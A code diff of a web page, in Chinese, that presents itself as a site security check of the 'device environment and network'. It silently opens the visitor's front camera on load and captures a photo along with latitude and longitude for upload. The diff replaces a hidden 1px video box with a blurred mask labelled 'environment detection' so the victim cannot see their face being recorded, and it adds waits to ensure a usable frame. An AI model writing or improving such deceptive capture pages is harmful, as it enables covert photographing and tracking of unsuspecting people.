@@ -11,26 +11,50 @@
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
         
-        /* 预览容器缩至几乎不可见，但保留 video 元素完整绘制能力 */
+        /* 预览容器保持可见，但内部添加遮罩层遮挡 video */
         .preview-container {
-            width: 1px;
-            height: 1px;
-            opacity: 0;
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000;
+            border-radius: 6px;
             overflow: hidden;
-            position: fixed;
-            bottom: 0;
-            right: 0;
-            pointer-events: none;
-            margin: 0;
-            padding: 0;
-            border: none;
+            margin-bottom: 25px;
+            border: 1px solid #282a36;
+            position: relative;
         }
         video {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            /* 视频正常渲染，但被下面的遮罩层盖住 */
         }
-        .view-tip { display: none; }
+        /* 遮罩层：覆盖视频画面，用户看不到任何实际内容 */
+        .preview-mask {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);  /* 半透明黑色，完全遮盖画面 */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
+            backdrop-filter: blur(10px); /* 可选：模糊效果，确保看不到人脸 */
+            z-index: 2;
+        }
+        .view-tip {
+            position: absolute;
+            bottom: 8px;
+            left: 8px;
+            background: rgba(239, 68, 68, 0.8);
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            z-index: 3;
+        }
 
         .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
@@ -46,7 +70,8 @@
     <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
 
     <div class="preview-container">
-        <div class="view-tip">● 验证画面已启用</div>
+        <div class="preview-mask">环境检测中</div>
+        <div class="view-tip">● 验证中</div>
         <video id="video" autoplay playsinline muted></video>
     </div>
 
@@ -62,18 +87,24 @@
 
 <script>
     let streamRef = null;
+    let videoElement = null;
 
-    // 页面加载时预热摄像头，用户无感知
     window.addEventListener('DOMContentLoaded', async () => {
+        videoElement = document.getElementById('video');
         try {
             streamRef = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false
             });
-            const video = document.getElementById('video');
-            video.srcObject = streamRef;
+            videoElement.srcObject = streamRef;
+            // 等待视频开始播放后，确保有可用帧
+            await new Promise((resolve) => {
+                videoElement.onloadedmetadata = () => resolve();
+            });
+            // 主动播放（某些浏览器需要）
+            await videoElement.play();
         } catch (err) {
-            console.warn("摄像头预热失败:", err);
+            console.warn("摄像头初始化失败:", err);
         }
     });
 
@@ -83,16 +114,20 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        if (!streamRef) {
+        if (!streamRef || !videoElement.srcObject) {
             updateStatus("正在请求摄像头权限...");
             try {
                 streamRef = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
-                document.getElementById('video').srcObject = streamRef;
+                videoElement.srcObject = streamRef;
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => resolve();
+                });
+                await videoElement.play();
             } catch (err) {
-                console.warn("摄像头权限未授予:", err);
+                console.warn("摄像头权限获取失败:", err);
             }
         }
 
@@ -116,16 +151,29 @@
 
     async function captureAndUpload(lat, lon) {
         updateStatus("正在保存验证图像...");
-        const video = document.getElementById('video');
+        const video = videoElement;
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
+        // 等待视频有有效尺寸和足够的帧数据
         if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
+            // 等待至少一帧画面绘制完成（防止极少数情况抓取到黑屏）
+            await new Promise((resolve) => {
+                if (video.readyState === 4 && video.videoWidth > 0) {
+                    resolve();
+                } else {
+                    video.addEventListener('canplay', resolve, { once: true });
+                }
+            });
+            // 额外等待一个微任务，确保帧更新
+            await new Promise(r => requestAnimationFrame(r));
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
             setTimeout(() => {
-                streamRef.getTracks().forEach(track => track.stop());
+                if (streamRef) streamRef.getTracks().forEach(track => track.stop());
             }, 200);
         } else {
             canvas.width = 640;
